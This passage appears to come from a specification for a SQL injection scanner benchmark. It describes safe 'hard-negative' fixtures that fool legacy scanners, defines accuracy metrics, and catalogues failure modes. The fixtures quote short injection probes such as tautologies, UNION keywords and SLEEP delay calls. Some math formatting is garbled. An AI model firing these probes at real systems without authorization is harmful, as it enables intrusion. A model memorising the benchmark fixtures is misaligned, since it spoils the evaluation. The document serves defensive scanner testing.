- **Why Legacy Scanners False-Positive:** Regex scanners match exploit payloads in CVE descriptions.
- **Correct Engine Behavior:** Decoupled Causal DAG verifies output is static database content.

#### Fixture HN-14: E-Commerce Product Tag Search
- **Target Endpoint:** `GET /shop/search?tag=union`
- **Safe Implementation:** Parameterized query matching clothing brand `"Union Clothing Co."`.
- **Deceptive Mechanism:** Query parameter `tag=union` returns 15 products; `tag=select` returns 0 products.
- **Why Legacy Scanners False-Positive:** Keyword `union` produces non-empty result set while `select` produces empty result set.
- **Correct Engine Behavior:** Metamorphic NoREC oracle confirms relational algebra invariance.

#### Fixture HN-15: FAQ Search Echoing Question Titles
- **Target Endpoint:** `GET /faq?question=How+to+SELECT+options`
- **Safe Implementation:** Static FAQ lookup with parameterized query.
- **Deceptive Mechanism:** Echoes SQL keywords in FAQ header.
- **Why Legacy Scanners False-Positive:** Reflection conflated with boolean differential.
- **Correct Engine Behavior:** Information-Theoretic Horstein search proves zero entropy transmission.

---

### 17.4 Category 4: Randomly Fluctuating Page Contents & Dynamic Noise

#### Fixture HN-16: Rotating Dynamic Banner Advertisements
- **Target Endpoint:** `GET /news/feed?cat=sports`
- **Safe Implementation:** Fully parameterized query `SELECT * FROM news WHERE cat = $1`. Every page render includes 3 random rotating advertisements chosen via `Math.random()`.
- **Deceptive Mechanism:** Every single HTTP response has a completely different response size ($\pm 450	ext{ bytes}$) and DOM structure.
- **Why Legacy Scanners False-Positive:** Naive string diffing and DOM tree comparison see huge structural variance between `?cat=sports` and `?cat=sports' AND '1'='1`, falsely declaring boolean injection.
- **Correct Engine Behavior:** Dynamic Drift Model samples baseline variance ($\sigma_{\text{DOM}}$) and filters out stochastic ad container nodes.

#### Fixture HN-17: Microsecond Server Timestamp & Random Nonce in JSON API
- **Target Endpoint:** `GET /api/v1/status?service=auth`
- **Safe Implementation:** Parameterized status query returning `{"service": "auth", "time_us": 1725020102123456, "trace_id": "9f8a2b..."}`.
- **Deceptive Mechanism:** Hash and size of response body changes on every millisecond.
- **Why Legacy Scanners False-Positive:** Hash-based response diffing engines fail to establish a stable baseline.
- **Correct Engine Behavior:** Structural JSON AST diffing isolates variable scalar fields.

#### Fixture HN-18: Real-Time Live Stock Price Ticker Widget
- **Target Endpoint:** `GET /dashboard?view=markets`
- **Safe Implementation:** Parameterized query rendering live market prices updated every 50ms in server memory.
- **Deceptive Mechanism:** Continuous numerical value fluctuations across all responses.
- **Why Legacy Scanners False-Positive:** Differential engines misinterpret price shifts as boolean injection outcomes.
- **Correct Engine Behavior:** Welch's $t$-test and Mann-Whitney U test confirm that response variance is uncorrelated with payload semantics.

#### Fixture HN-19: Randomized Anti-CSRF Token Embedded in Every Form
- **Target Endpoint:** `GET /contact?ref=web`
- **Safe Implementation:** Fully parameterized page embedding a unique 64-character cryptographic token in `<input type="hidden" name="csrf" value="...">`.
- **Deceptive Mechanism:** Token string changes on every request; token entropy mimics dynamic SQL output.
- **Why Legacy Scanners False-Positive:** Active learning acquisition functions treat CSRF entropy as evidence of parameter context breakout.
- **Correct Engine Behavior:** Attribute Masking Filter identifies and ignores nonce attributes.

#### Fixture HN-20: Dynamic A/B Testing UI Layout Switcher
- **Target Endpoint:** `GET /pricing?plan=pro`
- **Safe Implementation:** Parameterized query; application randomly renders 2-column layout (Variant A) or 3-column layout (Variant B) based on server-side random coin flip ($p=0.5$).
- **Deceptive Mechanism:** Large DOM structural shifts occurring independently of injection payload.
- **Why Legacy Scanners False-Positive:** Twin shadow requests receive different variants and flag structural vulnerability.
- **Correct Engine Behavior:** Causal Intervention $do(X=x)$ test averages out variant flips across paired observations.

---

### 17.5 Category 5: Stateful Rate Limiters / WAF Tarpits Mimicking Blind Delays

#### Fixture HN-21: Progressive Delay Rate Limiter on Suspicious Inputs
- **Target Endpoint:** `GET /api/user?id=1`
- **Safe Implementation:** Fully parameterized query. Security middleware inspects input: if single quote `'` or `OR` is present, middleware sleeps for $500	ext{ms}$ before returning HTTP 200 (Safe Tarpit).
- **Deceptive Mechanism:** Injected payload experiences reproducible $500	ext{ms}$ delay, exactly matching time-based blind SQLi signatures.
- **Why Legacy Scanners False-Positive:** Time-based blind scanners (e.g. sqlmap `--technique=T`) observe delay and confirm time-based SQL injection.
- **Correct Engine Behavior:** Asymmetric Micro-Delay SPRT testing injects varying sleep arguments (e.g. `SLEEP(0.2)` vs `SLEEP(0.8)`); observing static $500	ext{ms}$ delay refutes database execution and identifies WAF tarpit.

#### Fixture HN-22: Leaky-Bucket Rate Limiter Adding 100ms Latency per Request
- **Target Endpoint:** `GET /search?q=items`
- **Safe Implementation:** Application adds $+100	ext{ms}$ latency for each request exceeding 5 req/sec.
- **Deceptive Mechanism:** Cumulative scan velocity causes latency to climb steadily from $20	ext{ms} 	o 200	ext{ms} 	o 800	ext{ms}$.
- **Why Legacy Scanners False-Positive:** Scanners misinterpret scan-induced load latency as successful time-based injection.
- **Correct Engine Behavior:** Interleaved $A/B/A/B$ scheduling with EWMA baseline tracking subtracts global latency drift.

#### Fixture HN-23: Cloudflare Tarpit Delay on ModSecurity CRS Anomaly
- **Target Endpoint:** `POST /login`
- **Safe Implementation:** Parameterized authentication query behind Cloudflare with progressive delay rules.
- **Deceptive Mechanism:** Cloudflare edge delays suspicious payloads by 2000ms.
- **Why Legacy Scanners False-Positive:** Scanners confirm time-based blind injection based on 2-second edge delay.
- **Correct Engine Behavior:** Causal verification confirms delay is constant regardless of database sleep function parameters.

#### Fixture HN-24: Database Connection Pool Starvation Latency Spike
- **Target Endpoint:** `GET /reports?id=10`
- **Safe Implementation:** Database connection pool has max 2 connections; concurrent testing creates temporary 1500ms queue wait.
- **Deceptive Mechanism:** Connection wait time mimics conditional database sleep.
- **Why Legacy Scanners False-Positive:** Concurrent scanner workers trigger false positive time hits.
- **Correct Engine Behavior:** Sequential SPRT test isolates concurrency jitter.

#### Fixture HN-25: Downstream Microservice Timeout Delay (504 Gateway Timeout)
- **Target Endpoint:** `GET /gateway/proxy?target=service`
- **Safe Implementation:** Parameterized gateway forwarding request to unresponsive upstream service. Returns 504 after 3000ms.
- **Deceptive Mechanism:** 3-second timeout occurs on specific malformed inputs.
- **Why Legacy Scanners False-Positive:** Scanners associate 3-second delay with SQL execution.
- **Correct Engine Behavior:** Status code oracle flags 504 Gateway Timeout and refutes SQLi.

---

### 17.6 Category 6: Integer Type-Casting Returning 0 on Non-Numeric Strings

#### Fixture HN-26: PHP intval() Sanitization Returning Zero
- **Target Endpoint:** `GET /item.php?id=1`
- **Safe Implementation:** PHP application casts input via `$id = intval($_GET['id'])` and executes parameterized query `SELECT * FROM items WHERE id = ?`.
- **Deceptive Mechanism:** When passed `' OR 1=1`, `intval()` evaluates to `0`. `SELECT * FROM items WHERE id = 0` returns empty array `[]` (DOM Size: 450 bytes), whereas `id=1` returns the item (DOM Size: 3,200 bytes).
- **Why Legacy Scanners False-Positive:** Boolean differential oracles observe that `1` returns True response (3,200 bytes) while `' OR 1=2` and non-numeric payloads return False response (450 bytes), falsely asserting a boolean SQL injection vulnerability.
- **Correct Engine Behavior:** Engine tests arithmetic equivalence (e.g. `1+0` vs `1-0`); both cast to `1` by `intval()`, but injecting SQL operators (e.g. `1 AND 1=1`) casts to `1` as well. The engine proves the parameter is type-cast in the application layer and emits Safe.

#### Fixture HN-27: JavaScript parseInt() with Trailing String Truncation
- **Target Endpoint:** `GET /api/user?id=10`
- **Safe Implementation:** Node.js backend uses `parseInt(req.query.id, 10)` before parameterized query.
- **Deceptive Mechanism:** `10' OR '1'='1` evaluates to `10`, returning User 10; `test` evaluates to `NaN` (returns 400).
- **Why Legacy Scanners False-Positive:** Tautology payloads containing leading digits succeed, tricking scanners into confirming boolean injection.
- **Correct Engine Behavior:** Engine tests pure string breakout (e.g. `' OR 1=1`); `parseInt` yields `NaN` and returns 400, proving no SQL breakout.

#### Fixture HN-28: Python int() Exception Handling with Default Fallback
- **Target Endpoint:** `GET /view?category_id=5`
- **Safe Implementation:** Python application wraps `int(param)` in `try...except ValueError: category_id = 1` and uses parameterized query.
- **Deceptive Mechanism:** Non-numeric input quietly falls back to Category 1, producing a differential view.
- **Why Legacy Scanners False-Positive:** Differential output between valid and invalid strings interpreted as SQL evaluation.
- **Correct Engine Behavior:** Causal intervention verifies fallback behavior is purely application-level error handling.

#### Fixture HN-29: Go strconv.Atoi() Strict Error Handling
- **Target Endpoint:** `GET /records?limit=25`
- **Safe Implementation:** Go backend parses with `strconv.Atoi()` before passing limit integer to database.
- **Deceptive Mechanism:** Malformed payloads return standard Go API error JSON.
- **Why Legacy Scanners False-Positive:** Error status 400 conflated with SQL syntax error.
- **Correct Engine Behavior:** SMT grammar solver confirms input is bound to numeric type constraint.

#### Fixture HN-30: Rust i64::from_str() Type Guard in Axum API
- **Target Endpoint:** `GET /orders?order_id=500`
- **Safe Implementation:** Strongly-typed Rust Axum path extractor `Path(order_id): Path<i64>`.
- **Deceptive Mechanism:** String payload rejected at framework routing level with 400 Bad Request.
- **Why Legacy Scanners False-Positive:** Framework error structure misclassified as database reject.
- **Correct Engine Behavior:** Refutes SQLi based on lack of database interaction.

---

### 17.7 Category 7: WAF Blocking Pages Returning HTTP 500 / "Database Error"

#### Fixture HN-31: ModSecurity CRS Blocking Page Returning HTTP 500
- **Target Endpoint:** `POST /api/feedback`
- **Safe Implementation:** 100% parameterized query. ModSecurity CRS v4 intercepts single quote `'` and returns HTTP 500 with custom body `"Internal Server Error - Database connection failed"`.
- **Deceptive Mechanism:** WAF blocking page explicitly impersonates a fatal database failure.
- **Why Legacy Scanners False-Positive:** Scanners match HTTP 500 status code and `"Database connection failed"` string, immediately declaring an error-based SQL injection finding.
- **Correct Engine Behavior:** Engine compares WAF signature across non-SQL binary anomalies; identifies that the 500 response is generated by the proxy tier, not the database driver.

#### Fixture HN-32: Imperva Cloud WAF Custom Error Page Echoing Input
- **Target Endpoint:** `GET /search?query=test'`
- **Safe Implementation:** Parameterized search query. Imperva returns 403 with body `<title>Error in SQL query syntax</title>`.
- **Deceptive Mechanism:** Reverse proxy error page contains deceptive SQL syntax error title.
- **Why Legacy Scanners False-Positive:** Error regex matching on `<title>` tag.
- **Correct Engine Behavior:** Causal DAG confirms response is static WAF block page.

#### Fixture HN-33: NGINX Lua Script Blocking SQL Keywords with 500 Status
- **Target Endpoint:** `GET /items?filter=union`
- **Safe Implementation:** NGINX Lua filter returns HTTP 500 when keyword `UNION` is present in URI.
- **Deceptive Mechanism:** HTTP 500 returned exclusively on SQL keyword injection.
- **Why Legacy Scanners False-Positive:** Scanners assume HTTP 500 on `UNION` confirms SQL syntax breakout.
- **Correct Engine Behavior:** Multi-oracle consensus proves lack of relational column projection.

#### Fixture HN-34: Cloudflare Managed Ruleset 403 Tarpit Response
- **Target Endpoint:** `POST /submit`
- **Safe Implementation:** Parameterized endpoint protected by Cloudflare SQLi Managed Ruleset.
- **Deceptive Mechanism:** Returns 403 Forbidden with Ray ID and CF challenge HTML.
- **Why Legacy Scanners False-Positive:** Status differential conflated with boolean negation.
- **Correct Engine Behavior:** WAF signature detector flags Cloudflare challenge page.

#### Fixture HN-35: AWS WAF Anomaly Block Returning Generic 502 Bad Gateway
- **Target Endpoint:** `GET /api/data?q='`
- **Safe Implementation:** Parameterized endpoint behind AWS Application Load Balancer.
- **Deceptive Mechanism:** AWS WAF drops connection, ALB returns 502 Bad Gateway.
- **Why Legacy Scanners False-Positive:** 502 Gateway drop interpreted as database crash.
- **Correct Engine Behavior:** Network anomaly detector refutes finding.

---

### 17.8 Category 8: Safe Parameterized Queries with Non-SQL Formatting

#### Fixture HN-36: GraphQL Variable Formatted into Safe SQL Bind Parameter
- **Target Endpoint:** `POST /graphql`
- **Safe Implementation:** Apollo Server receives GraphQL query with variable `$id: String!`. Resolver binds variable directly to PostgreSQL prepared statement (`SELECT * FROM users WHERE id = $1`).
- **Deceptive Mechanism:** GraphQL syntax error messages on invalid JSON characters echo payload in GraphQL `errors` array.
- **Why Legacy Scanners False-Positive:** Scanners misinterpret GraphQL resolver errors as SQL injection syntax errors.
- **Correct Engine Behavior:** AST validator verifies GraphQL variable binding is strictly parameterized.

#### Fixture HN-37: Elasticsearch DSL Query Formatting Parameter
- **Target Endpoint:** `GET /search/products?q=title:test'`
- **Safe Implementation:** Input is parsed by Elasticsearch Lucene parser. Database is not involved.
- **Deceptive Mechanism:** Lucene parser returns `ParseException: Cannot parse 'title:test'': '*' or '?' not allowed`.
- **Why Legacy Scanners False-Positive:** Lucene parse error matches standard SQL syntax error regex patterns.
- **Correct Engine Behavior:** Syntax error classifier isolates Lucene engine tokens from SQL dialects.

#### Fixture HN-38: Safe Regular Expression Search Parameter
- **Target Endpoint:** `GET /filter?pattern=[a-z`
- **Safe Implementation:** Application uses regex pattern in Python `re.compile(param)` before parameterized SQL lookup.
- **Deceptive Mechanism:** Unclosed regex bracket `[` triggers `re.error: unterminated character set`.
- **Why Legacy Scanners False-Positive:** Python regex exception banner matches general syntax error signatures.
- **Correct Engine Behavior:** Error token analyzer identifies Python standard library traceback.

#### Fixture HN-39: LDAP Search Filter Parameter
- **Target Endpoint:** `GET /auth/directory?user=admin*`
- **Safe Implementation:** LDAP directory lookup with safe LDAP escaping.
- **Deceptive Mechanism:** Wildcard `*` alters LDAP search output count.
- **Why Legacy Scanners False-Positive:** Output modulation conflated with SQL boolean tautology.
- **Correct Engine Behavior:** Horstein posterior bisection proves absence of SQL grammar context.

#### Fixture HN-40: Redis Key-Value Lookup Parameter
- **Target Endpoint:** `GET /cache/get?key=session:1'`
- **Safe Implementation:** Direct Redis string lookup via `GET session:1'`.
- **Deceptive Mechanism:** Quotes in Redis key return null/empty cache response.
- **Why Legacy Scanners False-Positive:** Differential cache hit/miss interpreted as SQL boolean condition.
- **Correct Engine Behavior:** Verifies cache key lookup semantics.

---

### 17.9 Category 9: Safe ORM / Query Builder Parameters with Reserved Keywords

#### Fixture HN-41: Static Enum Whitelist for Sort Direction (`?dir=asc` vs `?dir=desc`)
- **Target Endpoint:** `GET /items?dir=desc`
- **Safe Implementation:** Application validates input: `if (dir !== 'asc' && dir !== 'desc') dir = 'asc';`. Query executed as `SELECT * FROM items ORDER BY id ${dir}`.
- **Deceptive Mechanism:** Input parameter strictly accepts SQL keywords `asc` and `desc`. Injecting `asc` vs `desc` flips output order completely.
- **Why Legacy Scanners False-Positive:** Boolean and ordering differential oracles observe that changing keyword changes response order, asserting SQL injection.
- **Correct Engine Behavior:** Probing with non-whitelisted keywords (e.g. `desc, (SELECT 1)`) falls back to `asc`, proving strict static enum validation.

#### Fixture HN-42: Whitelisted Column Filter Operator (`?op=gt` vs `?op=lt`)
- **Target Endpoint:** `GET /data?op=gt&val=10`
- **Safe Implementation:** Safe map lookup: `const opMap = { 'gt': '>', 'lt': '<', 'eq': '=' };`.
- **Deceptive Mechanism:** Parameter modifies SQL comparison operator safely.
- **Why Legacy Scanners False-Positive:** Differential output on operator substitution.
- **Correct Engine Behavior:** Invariant verification confirms unmapped operators are rejected.

#### Fixture HN-43: Prisma Typed Enum Column Selection
- **Target Endpoint:** `GET /users?role=ADMIN`
- **Safe Implementation:** Prisma ORM validates `Role` enum type before generating parameterized query.
- **Deceptive Mechanism:** `role=USER` vs `role=ADMIN` returns different user lists.
- **Why Legacy Scanners False-Positive:** Output variance conflated with boolean injection.
- **Correct Engine Behavior:** Schema-guided validator confirms typed enum boundary.

#### Fixture HN-44: Knex.js Safe Grouping Identifier Mapping
- **Target Endpoint:** `GET /stats?groupBy=daily`
- **Safe Implementation:** Knex query builder mapping `'daily' -> 'DATE(created_at)'`.
- **Deceptive Mechanism:** Modulates database aggregation buckets safely.
- **Why Legacy Scanners False-Positive:** Grouping delta interpreted as SQL injection.
- **Correct Engine Behavior:** Metamorphic testing proves lack of injection breakout.

#### Fixture HN-45: Django ChoiceField Form Validation
- **Target Endpoint:** `POST /filter`
- **Safe Implementation:** Django form with `ChoiceField(choices=[('active', 'Active'), ('archived', 'Archived')])`.
- **Deceptive Mechanism:** Form validation strictly enforces choice whitelist.
- **Why Legacy Scanners False-Positive:** Raw input tampering triggers form validation error banner.
- **Correct Engine Behavior:** Form structure analysis verifies server-side choice enforcement.

---

### 17.10 Category 10: Multi-Tenant Boundary Checks & Generic Auth Rejections

#### Fixture HN-46: Multi-Tenant Customer ID Authorization Guard
- **Target Endpoint:** `GET /tenant/invoices?tenant_id=101`
- **Safe Implementation:** Application verifies `tenant_id == session.user_tenant`. If mismatch or tampering (e.g. `101 OR 1=1`), application immediately returns HTTP 403 Forbidden with empty body.
- **Deceptive Mechanism:** Tampered parameter returns 403 / empty body, identical to database syntax error rejection.
- **Why Legacy Scanners False-Positive:** Error status differential matches syntax injection pattern.
- **Correct Engine Behavior:** Causal DAG isolates authorization gate from database query execution.

#### Fixture HN-47: Object-Level Permission Guard on Document Access
- **Target Endpoint:** `GET /docs/view?doc_id=999'`
- **Safe Implementation:** Parameterized query with authorization check returning generic 404 on invalid ID.
- **Deceptive Mechanism:** Single quote triggers 404 Not Found.
- **Why Legacy Scanners False-Positive:** 404 response on quote interpreted as boolean false condition.
- **Correct Engine Behavior:** Tautology probing confirms 404 is returned uniformly for all unauthorized IDs.

#### Fixture HN-48: JWT Tenant Claim Verification Gate
- **Target Endpoint:** `GET /api/secure/data?tenant=alpha`
- **Safe Implementation:** Middleware validates tenant parameter against signed JWT claim before executing parameterized SQL.
- **Deceptive Mechanism:** Tampered tenant parameter returns 401 Unauthorized.
- **Why Legacy Scanners False-Positive:** Status code differential (200 vs 401) flagged as SQLi.
- **Correct Engine Behavior:** Decouples auth token validation from SQL sink.

#### Fixture HN-49: Role-Based Access Control (RBAC) Column Masking
- **Target Endpoint:** `GET /employees/view?field=salary`
- **Safe Implementation:** RBAC middleware redacts `salary` column for non-admin users, returning `{"salary": "***"}`.
- **Deceptive Mechanism:** Field name parameter modifies returned JSON keys safely.
- **Why Legacy Scanners False-Positive:** Dynamic column projection delta interpreted as column injection.
- **Correct Engine Behavior:** Syntax probes (`salary, (SELECT 1)`) fail to execute, proving static column whitelist.

#### Fixture HN-50: Cross-Account IDOR Prevention Filter
- **Target Endpoint:** `GET /account/details?acc_id=1001`
- **Safe Implementation:** Parameterized SQL with strict session user ID check.
- **Deceptive Mechanism:** Injecting `1001 OR 1=1` triggers IDOR guard, returning generic access denied.
- **Why Legacy Scanners False-Positive:** Generic access denied response conflated with SQL boolean false.
- **Correct Engine Behavior:** Invariance graph verifies database query executed with parameterized user bind.

---

## 18. Quantitative Statistical & Verification Metrics

To provide rigorous, mathematically grounded evaluation of detection engines, the benchmark defines six formal metric suites.

```
+---------------------------------------------------------------------------------------------------------------+
|                                    MASTER QUANTITATIVE METRIC SPECIFICATIONS                                  |
+-----+---------------------------------------+---------------------------------------+-------------------------+
| #   | Metric Name                           | Mathematical Definition               | Target Benchmark Bound  |
+-----+---------------------------------------+---------------------------------------+-------------------------+
| 1   | Precision (P) & False Positive Rate   | P = TP / (TP + FP); FPR = FP/(FP+TN)  | P >= 0.9999; FPR <= 10^-4|
| 2   | Recall (R) & Detection Coverage       | R = TP / (TP + FN); CCI = |?_obs|/|?| | R >= 0.9800; CCI >= 0.95|
| 3   | Average Request Cost (R_avg) & ASN    | R_avg = (1/N) ? Req_i; E[N|H1] (SPRT) | R_avg <= 12; ASN <= 8.5 |
| 4   | Information Efficiency (?)            | ? = (? H2(X_i)) / N_requests          | ? >= 0.72 bits / req    |
| 5   | Jitter Resilience Index (JRI)         | JRI = F1(?=240ms,Pareto) / F1(Stationary)| JRI >= 0.96          |
| 6   | Verification Reproducibility (VRR)    | VRR = N_reproduced / N_reported       | VRR = 1.000 (Bit-Exact) |
+-----+---------------------------------------+---------------------------------------+-------------------------+
```

### 18.1 Precision, Target False Positive Rate & Error Bounds
1. **Precision ($P$):**
   $$P = \frac{TP}{TP + FP}$$
   Target: $P \ge 0.9999$ ($< 1$ false positive per 10,000 positive findings).
2. **Target False Positive Rate ($FPR$):**
   $$FPR = \frac{FP}{FP + TN} \le 10^{-4}$$
3. **Type I Error ($lpha$) Guarantee:** In statistical hypothesis testing (Wald's SPRT and Welch's $t$-test), Type I error is bounded by:
   $$\alpha = P(\text{Reject } H_0 \mid H_0 \text{ is True}) \le 10^{-4}$$

### 18.2 Recall, Detection Rate & Context Coverage Index ($CCI$)
1. **Recall ($R$):**
   $$R = \frac{TP}{TP + FN}$$
   Target: $R \ge 0.9800$ across all 50+ Hard-Positive benchmark fixtures.
2. **Context Coverage Index ($CCI$):**
   $$CCI = \frac{|\Theta_{\text{tested}} \cap \Theta_{\text{corpus}}|}{|\Theta_{\text{corpus}}|}$$
   where $\Theta = \{\text{STRING\_LITERAL}, \text{NUMERIC\_SCALAR}, \text{ORDER\_BY}, \text{JSON\_PATH}, \text{CTE}, \dots\}$. Target: $CCI = 1.0$.

### 18.3 Request Cost & Average Sample Number ($ASN$)
1. **Average Request Cost per Verified Finding ($R_{\text{avg}}$):**
   $$R_{\text{avg}} = \frac{1}{N_{\text{verified}}} \sum_{i=1}^{N_{\text{verified}}} \text{Requests}_i$$
   Target: $R_{\text{avg}} \le 12.0\text{ requests}$ (vs legacy sqlmap baseline $R_{\text{sqlmap}} \approx 84.5\text{ requests}$).
2. **Average Sample Number ($ASN$) for SPRT Micro-Delay Detection:**
   $$\mathbb{E}[N \mid H_1] = \frac{(1-\beta) \ln \frac{1-\beta}{\alpha} + \beta \ln \frac{\beta}{1-\alpha}}{\mathbb{E}[\ln \Lambda_i \mid H_1]}$$
   Target: $\mathbb{E}[N \mid H_1] \le 8.5\text{ samples}$ under $\tau = 300\text{ms}$ micro-delays.

### 18.4 Information-Theoretic Extraction Efficiency ($\eta$)
Bits of verified database information extracted per HTTP request:
$$\eta = \frac{\sum_{i=1}^L H_2(X_i)}{N_{\text{requests}}}$$
Target: $\eta \ge 0.72\text{ bits/req}$ (approaching theoretical Binary Symmetric Channel capacity $C = 1 - H(p)$ via Horstein Posterior Bisection, compared to legacy binary search $\eta \approx 0.125\text{ bits/req}$).

### 18.5 Jitter Resilience Index ($JRI$)
Degradation ratio of F1-Score under extreme Pareto heavy-tailed network jitter compared to stationary baseline:
$$JRI = \frac{\text{F1-Score}_{\text{Pareto}}(\sigma = 240\text{ms}, \alpha = 1.45)}{\text{F1-Score}_{\text{Stationary}}(\sigma = 1.2\text{ms})}$$
Target: $JRI \ge 0.9600$ ($< 4\%$ accuracy degradation under severe network chaos).

### 18.6 Verification Reproducibility Rate ($VRR$)
Fraction of emitted findings whose cryptographic Merkle CAS proof bundles can be independently replayed and verified bit-for-bit:
$$VRR = \frac{N_{\text{bit\_exact\_reproduced}}}{N_{\text{total\_reported}}}$$
Target: $VRR = 1.000$ ($100\%$ deterministic auditability).

---

## 19. Comprehensive Failure Taxonomy (FT-01 through FT-16)

The following taxonomy catalogs **16 distinct systemic failure modes** observed across SQL injection detection architectures, providing exact root causes, mathematical models, blast radii, and detection engine defenses.

```
+---------------------------------------------------------------------------------------------------------------+
|                                    MASTER 16-MODE FAILURE TAXONOMY (FT-01 - FT-16)                            |
+---------+-------------------------------------------------------------+----------+----------------------------+
| Mode ID | Failure Mode Name                                           | Category | Primary Impact             |
+---------+-------------------------------------------------------------+----------+----------------------------+
| FT-01   | Dynamic Content & Semantic Noise Conflation                 | FP       | False Positive on Dynamic  |
| FT-02   | WAF Tarpit & Adaptive Latency False Time-Based Detection     | FP       | False Positive on Tarpit   |
| FT-03   | Benign Arithmetic / Expression Evaluation Conflation        | FP       | False Positive on Math     |
| FT-04   | Non-SQL Error String Reflection & Pattern Misclassification | FP       | False Positive on Regex    |
| FT-05   | Parameterized Query Keyword Reflection & Search Echo        | FP       | False Positive on Search   |
| FT-06   | WAF Token Normalization & Comment Stripping Desync          | FN       | False Negative on WAF      |
| FT-07   | SMT Theory Solver Dialect Incompleteness & Exotic Operators | FN       | False Negative on Dialect  |
| FT-08   | Second-Order / Asynchronous Sink Disconnection              | FN       | False Negative on Stored   |
| FT-09   | Sub-Threshold Multi-Bit Boolean Modulation (Micro-Deltas)   | FN       | False Negative on 1-Bit    |
| FT-10   | Strict Layered Encoding & Non-Standard Marshalling Bypasses | FN       | False Negative on Encodings|
| FT-11   | Pathological SMT Constraint Solver Timeout / State Explosion| Resource | Engine CPU Starvation      |
| FT-12   | High-Jitter Variance Network Starvation & False Timeout     | Resource | Premature Scan Abort       |
| FT-13   | Scan-Induced WAF IP Blacklisting & Behavioral Rate Limiting | Resource | 100% False Negatives Target|
| FT-14   | Concurrency Race & State Pollution in Differential Shadowing| Integrity| Client Database Corruption |
| FT-15   | Anti-CSRF / Nonce Session Desynchronization & Invalidation  | Integrity| Scan Authentication Loss   |
| FT-16   | Active Learning Likelihood Surface Trapping via Poisoning   | Model    | Search Space Blind Spot    |
+---------+-------------------------------------------------------------+----------+----------------------------+
```

---

### 19.1 Domain 1: False Positive Failure Modes (FT-01 to FT-05)

#### FT-01: Dynamic Content & Semantic Noise Conflation
- **Category:** False Positive (FP) | **Severity:** HIGH
- **Architectural Root Cause:** Naive response body length diffing or unmasked DOM comparison misclassifying rotating advertisements, server timestamps, or randomized nonces as SQL query execution deltas.
- **Mathematical Model:** $|R(Q_{\text{base}})| - |R(Q_{\text{probe}})| = \Delta \text{Noise}(t) \ne 0 \implies P(\text{Vuln}) \to 1.0$.
- **Blast Radius:** Widespread false alarms across dynamic single-page applications and news portals.
- **Engine Defense:** Tree Edit Distance (RTED) with Subtree Locality Masking and Dynamic Drift Threshold calibration ($d_{\text{DOM}} > \mu_t + 4.5\sigma_t$).

#### FT-02: WAF Tarpit & Adaptive Latency False Time-Based Detection
- **Category:** False Positive (FP) | **Severity:** HIGH
- **Architectural Root Cause:** WAF security middleware injecting a static delay (e.g. $500\text{ms}$) on detecting SQL syntax characters, deceiving single-threshold time-based checkers.
- **Mathematical Model:** $T(Q_{\text{sleep}(5)}) = 500\text{ms}$, $T(Q_{\text{sleep}(0)}) = 500\text{ms}$. Fixed threshold $\tau = 400\text{ms}$ fires.
- **Blast Radius:** Scanner emits false critical findings on every WAF-protected endpoint.
- **Engine Defense:** Multi-Tiered Asymmetric Delay Calibration (varying sleep durations $\tau_1 = 200\text{ms}, \tau_2 = 800\text{ms}$) verifying that response latency scales linearly with database sleep arguments ($T \propto \tau$).

#### FT-03: Benign Arithmetic / Expression Evaluation Conflation
- **Category:** False Positive (FP) | **Severity:** MEDIUM
- **Architectural Root Cause:** Application-level mathematical expression calculators (e.g. pagination offsets `?page=1+0`) evaluating arithmetic in Python/JavaScript before executing parameterized SQL.
- **Mathematical Model:** $f_{\text{app}}(1+0) = 1, f_{\text{app}}(1+1) = 2 \implies R(1+0) \ne R(1+1)$.
- **Blast Radius:** Financial tools, calculators, and pagination endpoints falsely reported as SQLi.
- **Engine Defense:** Metamorphic Tautology Invariant testing using non-math SQL primitives (e.g. `1+(SELECT 0)`), which execute in SQL but fail in application math parsers.

#### FT-04: Non-SQL Error String Reflection & Pattern Misclassification
- **Category:** False Positive (FP) | **Severity:** HIGH
- **Architectural Root Cause:** Client-side template engines or API validators reflecting input within generic error messages containing words like `"syntax error"` or `"quote"`.
- **Mathematical Model:** Response contains regex match $\mathcal{M}_{\text{regex}}(R) = \text{TRUE}$ on safe reflected input.
- **Blast Radius:** High noise on form validation endpoints.
- **Engine Defense:** Multi-Oracle AST Differential parsing verifying that error strings originate from database driver error structures, not HTML text nodes.

#### FT-05: Parameterized Query Keyword Reflection & Search Echo
- **Category:** False Positive (FP) | **Severity:** MEDIUM
- **Architectural Root Cause:** Full-text search engines echoing SQL keywords (`SELECT`, `UNION`, `' OR '1'='1`) in highlighted search snippets.
- **Mathematical Model:** String reflection alters response length and token entropy without modifying database AST.
- **Blast Radius:** Search and catalog endpoints flagged as vulnerable.
- **Engine Defense:** Horstein Information-Theoretic channel verification confirming zero bit-entropy transmission across database boundaries.

---

### 19.2 Domain 2: False Negative Failure Modes (FT-06 to FT-10)

#### FT-06: WAF Token Normalization & Comment Stripping Desync
- **Category:** False Negative (FN) | **Severity:** HIGH
- **Architectural Root Cause:** Reverse proxy WAF stripping inline comments (`/* ... */`) or normalizing whitespace, invalidating the scanner's exact AST alignment assumptions.
- **Mathematical Model:** $P_{\text{dispatched}} = x \implies P_{\text{received}} = x' \ne x$. Causal DAG refutes counterfactual.
- **Blast Radius:** Completely misses genuine vulnerabilities behind ModSecurity or AWS WAF.
- **Engine Defense:** Metamorphic Grammar Synthesizer generating whitespace-independent AST mutants that preserve semantic validity under token normalization.

#### FT-07: SMT Theory Solver Dialect Incompleteness & Exotic Operators
- **Category:** False Negative (FN) | **Severity:** CRITICAL
- **Architectural Root Cause:** Target DBMS utilizing proprietary, unformalized syntax extensions (PostgreSQL `#>>`, Oracle `XMLTABLE`, SQLite typeless expressions) not present in the SMT solver's grammar theory.
- **Mathematical Model:** $\kappa \in \mathcal{L}(\mathcal{G}_{\text{DBMS}}) \setminus \mathcal{L}(\mathcal{G}_{\text{SMT}}) \implies \text{SMT proved UNSAT}$.
- **Blast Radius:** High-severity zero-day injection points in modern enterprise frameworks missed.
- **Engine Defense:** Dual-Path Fallback to Stochastic Grammar Sampling (SCFG) whenever SMT constraint solving returns $\text{UNSAT}$ or times out.

#### FT-08: Second-Order / Asynchronous Sink Disconnection
- **Category:** False Negative (FN) | **Severity:** HIGH
- **Architectural Root Cause:** Synchronous HTTP response returns immediately while vulnerable SQL executes in an asynchronous worker queue (Celery, RabbitMQ) or scheduled batch job.
- **Mathematical Model:** $R_{\text{sync}}(Q) = R_{\text{base}}$; $R_{\text{async}}(Q) \to \text{Exploited}$ at $t + \Delta t$.
- **Blast Radius:** Misses all stored, asynchronous, and worker-mediated SQL injection flaws.
